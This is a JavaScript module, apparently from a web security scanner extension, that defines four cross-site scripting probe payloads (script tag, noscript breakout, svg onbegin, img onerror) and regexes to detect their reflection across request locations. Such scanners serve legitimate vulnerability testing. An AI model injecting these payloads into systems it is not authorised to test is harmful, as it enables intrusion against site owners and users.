/* Author: Denis Podgurskii */
import { ptk_module_active } from "../active.js"

export class ptk_xss extends ptk_module_active  {
    constructor() {
        super()
        
        this.severity = "High"
        this.attacks = [
            {
                id: "xss_1",
                description: "XSS - Unfiltered <script> tag",
                methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
                location: ['Path', 'Query', 'Post', 'Cookie'],
                options: {
                    attackValue: "<script>alert('{AttackId}')</script>",
                    vulnRegex: `<script>alert\\(\\'{AttackId}\\'\\)\\s*<\\/script>`,
                    position: "before"
                }
            },
            {
                id: "xss_2",
                description: "XSS - Script tag after noscript tag",
                methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
                location: ['Path', 'Query', 'Post', 'Cookie'],
                options: {
                    attackValue: `</noscript><script>alert('{AttackId}')</script>`,
                    vulnRegex: `<\\/noscript><script>alert\\(\\'{AttackId}\\'\\)\\s*<\\/script>`,
                    position: "before"
                }
            },
            {
                id: "xss_3",
                description: "XSS - Svg tag with animation event",
                methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
                location: ['Path', 'Query', 'Post', 'Cookie'],
                options: {
                    attackValue: `<svg><animate onbegin=alert({AttackId}) attributeName=x dur=1s>`,
                    vulnRegex: `<svg><animate onbegin=alert\\({AttackId}\\) attributeName=x dur=1s>`,
                    position: "before"
                }
            },
            {
                id: "xss_4",
                description: "XSS - Img onerror",
                methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
                location: ['Path', 'Query', 'Post', 'Cookie'],
                options: {
                    attackValue: `<img src=x onerror=window.postMessage({"ptk":"{AttackId}"})>`,
                    vulnRegex: `<img src=x onerror=window.postMessage\\({"ptk":"{AttackId}"}\\)>`,
                    position: "before",
                    attackParamValue: null
                }
            }

            
        ]
    }

    prepareAttack(schema, attack, random) {
        attack.options.attackValue = attack.options.attackValue.replace('{AttackId}', random)
        attack.options.vulnRegex = attack.options.vulnRegex.replace('{AttackId}', random)
        if(attack.options.attackParamValue === null) attack.options.attackParamValue = random
        return { schema, attack }
    }

}